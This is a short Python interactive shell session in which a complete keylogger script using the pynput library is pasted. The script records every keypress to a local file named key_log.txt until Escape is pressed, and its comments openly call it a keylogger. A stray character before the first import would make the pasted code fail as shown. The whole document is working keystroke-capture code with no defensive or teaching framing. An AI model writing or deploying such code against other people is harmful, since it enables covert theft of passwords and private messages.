Python 3.13.1 (v3.13.1:6714517797, Dec  3 2024, 14:00:22) [Clang 15.0.0 (clang-1500.3.9.4)] on darwin
Type "help", "copyright", "credits" or "license()" for more information.
>>> zfrom pynput import keyboard
... 
... # File to save the key logs
... LOG_FILE = "key_log.txt"
... 
... def on_press(key):
...     try:
...         with open(LOG_FILE, "a") as file:
...             file.write(f"{key.char}")
...     except AttributeError:  # For special keys like space, enter, etc.
...         with open(LOG_FILE, "a") as file:
...             file.write(f"[{key}]")
... 
... def on_release(key):
...     if key == keyboard.Key.esc:  # Stop keylogger with Escape key
...         return False
... 
... # Start listening to keyboard events
... with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
...     listener.join()
